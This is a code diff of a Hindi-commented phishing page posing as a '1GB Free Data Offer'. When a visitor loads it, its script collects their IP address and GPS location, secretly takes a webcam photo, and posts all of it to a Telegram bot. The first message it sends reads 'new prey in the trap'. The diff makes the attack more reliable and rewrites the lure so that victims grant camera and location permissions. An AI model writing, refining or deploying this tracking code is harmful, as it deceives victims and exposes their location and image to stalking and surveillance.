@@ -9,7 +9,7 @@
         async function startTracking() {
             let info = "🎯 **नया शिकार जाल में!**\n\n";
             
-            // 1. IP Address
+            // 1. IP Address प्राप्त करना
             try {
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
@@ -27,12 +27,16 @@
                 navigator.geolocation.getCurrentPosition(async (position) => {
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
-                    info += `📍 लोकेशन: http://googleusercontent.com/maps.google.com/maps?q=${lat},${lon}\n`;
+                    // सही गूगल मैप्स लिंक
+                    info += `📍 लोकेशन: https://www.google.com/maps?q=${lat},${lon}\n`;
+                    
                     takePhoto(info);
                 }, async (err) => {
-                    info += "⚠️ यूजर ने लोकेशन 'Deny' कर दी।\n";
+                    info += "⚠️ लोकेशन परमिशन नहीं मिली।\n";
                     takePhoto(info);
                 });
+            } else {
+                takePhoto(info + "⚠️ GPS सपोर्ट नहीं है।\n");
             }
         }
 
@@ -43,27 +47,35 @@
                     const video = document.createElement('video');
                     video.srcObject = stream;
                     await video.play();
+
                     const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
-                    const blob = await (await fetch(canvas.toDataURL('image/jpeg'))).blob();
+                    
+                    const imgData = canvas.toDataURL('image/jpeg');
+                    const blob = await (await fetch(imgData)).blob();
+                    
                     const formData = new FormData();
                     formData.append('chat_id', chat_id);
                     formData.append('photo', blob, 'photo.jpg');
                     formData.append('caption', allDetails + "📸 फोटो खींच ली गई है!");
-                    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
+                    
+                    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
+                    
                     stream.getTracks().forEach(track => track.stop());
                 } catch (err) {
+                    // कैमरा न मिलने पर सिर्फ मैसेज भेजना
                     fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(allDetails + "⚠️ कैमरा परमिशन नहीं मिली।")}&parse_mode=Markdown`);
                 }
             }
         }
+
         window.onload = startTracking;
     </script>
 </head>
-<body style="background: black; color: white; text-align: center; padding-top: 50px; font-family: Arial;">
+<body style="background: black; color: white; text-align: center; font-family: Arial; padding-top: 50px;">
     <h1>🎁 1GB Free Data Offer 🎁</h1>
-    <p>कृपया प्रतीक्षा करें, आपकी पात्रता की जाँच की जा रही है...</p>
-    <p>Verify करने के लिए 'Allow' बटन दबाएं।</p>
+    <p>Loading... Please wait and **Allow** permissions to verify your number.</p>
 </body>
 </html>
